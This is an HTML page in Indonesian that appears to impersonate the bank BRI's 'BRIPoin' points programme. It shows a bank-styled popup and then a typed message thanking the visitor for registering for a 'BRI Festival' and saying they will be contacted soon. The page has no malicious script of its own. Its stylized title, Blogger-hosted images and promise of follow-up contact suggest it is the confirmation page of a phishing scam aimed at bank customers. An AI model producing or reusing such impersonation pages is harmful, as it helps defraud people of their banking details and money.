<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <meta name="theme-color" content="#0F78CB">
    <title>𝗕𝗥𝗜𝗣𝗼𝗶𝗻 | 𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗣𝗢𝗜𝗡-𝗺𝘂</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            padding: 0; margin: 0; width: 100%;
            font-family: 'Open Sans', sans-serif;
            background: #DEE7EE;
            position: fixed;
        }
        #popupku {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            width: 100%; height: 100%; background: rgba(0,0,0, 0.4); z-index: 9999;
        }
        .animated { animation: bounceIn 1s linear both; }
        @keyframes bounceIn { 
            0% { transform: scale(.1); opacity: 1; }
            70% { transform: scale(1); }
            100% { transform: scale(1); }
        }
        .naik { animation: bounceOutUp 1s ease-in both; }
        @keyframes bounceOutUp {
            0% { transform: translateY(0); }
            100% { transform: translateY(-500px); opacity: 1; }
        }
        /* Penyesuaian jarak kolom biru agar lebih ke bawah */
        .box-biru {
            width: 100%; 
            min-height: 165px; 
            border-radius: 15px;
            background: #2468A5; 
            padding: 25px 20px; 
            color: #fff;
            font-weight: bold; 
            font-size: 15px; 
            text-align: center;
            box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px;
            margin-top: 10px; /* Jarak diturunkan dari sebelumnya -30px menjadi 10px */
            text-shadow: #101010 1px 1px 0;
        }
    </style>
</head>
<body>

    <!-- Musik / Audio -->
    <audio hidden id="bsi">
        <source src="bsss.mp3" type="audio/mpeg">
    </audio>

    <!-- Popup Image -->
    <div id="popupku">
        <center>
            <img id="gambarku" class="animated" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgil5WlWV8L0jCTKbMpSN6oh8mNM64ze2Oq4jAnPOV3NAuczfZaacJHdUw77zmqMLiiQ1KgK5Y4LV2jX7MmSMrykHXppiBZazs683M1EeO3AWClwMwLRt95moVDCqVoXmPWkdMSUAvZw_d8bRDk_IoJCLVeUkoqoDMc4pYJCxwPAGNH-yXEF_AA7IMrUoE/s1080/IMG-20250408-WA0001.jpg" width="60%" style="margin-top: 250px; border-radius: 15px; border: 2px double #0F78CB;" onclick="tutupimg()">
        </center>
    </div>

    <!-- Navigasi -->
    <nav style="position: fixed; top: 0; left: 0; right: 0; z-index: 999;">
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3YMtAO_sO0lxX2JKOn54T96v9co39e7fyWuMS-IrWiD7vd_by6Fj1zksWwGzVmxn3GcmPRMO9RiHf3qfm3jHc34aQXlIvP_DG6oqB9kjjL-rCkfWQcac2p0V9Nax9IvM-6q4fVvZIjCF-4tnYdqiJ7UtRq_6_L27dTYs9w0uh69q4AAEtkixHT6az0RA/s1080/IMG-20250408-WA0002.jpg" style="width: 100%;">
    </nav>

    <!-- Banner -->
    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6L6COOa7f9lbxHo_RddlZdwFCTmk46NxZYlZIvkmUocxb0qiDJEYgCLT7SM7hF98gYKnl9El-5Yor7JfLvOB3k7kLbLMEndhaATBfAGKVC7TDrIaWwFEcxpqCHOCqqLFQPVqB4RAQ0P0m1OiVKrNOdW-jLF_COIFIx6ivgk4MHPUVcCJrb-6lqX7D9NI/s631/IMG-20250408-WA0000.jpg" style="width: 100%; border-radius: 0px 0px 100px 0px; border-bottom: 5px double #F6AA23; margin-top: 60px;">

    <!-- Kolom Biru -->
    <div class="container">
        <center>
            <div id="typed" class="box-biru"></div>
        </center>
    </div>

    <!-- Footer -->
    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwzhsQd1K7iF1d2s06-jdlmwaZV6_bR1eZiRCjx7LnbIHag5c5iAEOVfgP9UE-lQqv0M2-C7gQ3u6y6C-0E1iLZASRfrNtk7YOeBa_5obrbvmB4yi2MOjPPseRovva7VTIMmt3dXKcdlSDiqBt5-D_T5W1RiloJ5AOct6wnyv4SZI6Cj6Ahfc2j_x3NZA/s1080/1703668668502.png" style="width: 100%; position: fixed; bottom: 0;">

    <!-- Scripts -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/2.0.8/typed.min.js"></script>

    <script>
        function tutupimg() {
            $("#gambarku").addClass("naik");
            
            var audio = document.getElementById("bsi");
            audio.play();

            setTimeout(() => {
                $("#popupku").hide();
                new Typed('#typed', {
                    strings: ['', 'Terimakasih Sudah Melakukan Pendaftaran BRI Festival. Sebentar lagi kamu akan dihubungi...'],
                    typeSpeed: 45,
                    loop: false,
                    showCursor: false
                });
            }, 800);
        }
    </script>
</body>
</html>
